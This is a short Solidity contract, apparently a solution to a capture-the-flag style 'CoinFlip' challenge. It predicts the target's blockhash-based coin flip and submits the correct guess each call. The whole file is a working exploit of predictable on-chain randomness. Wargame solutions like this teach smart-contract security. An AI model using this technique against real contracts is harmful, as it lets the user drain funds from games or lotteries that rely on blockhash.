// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "hardhat/console.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract SolveCoinFlip {
    address public immutable coinFlipContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contract) {
        coinFlipContract = _contract;
    }

    function callFlip() external returns (bool res) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        res = ICoinFlip(coinFlipContract).flip(guess);
        // console.log("result", res);
    }
}
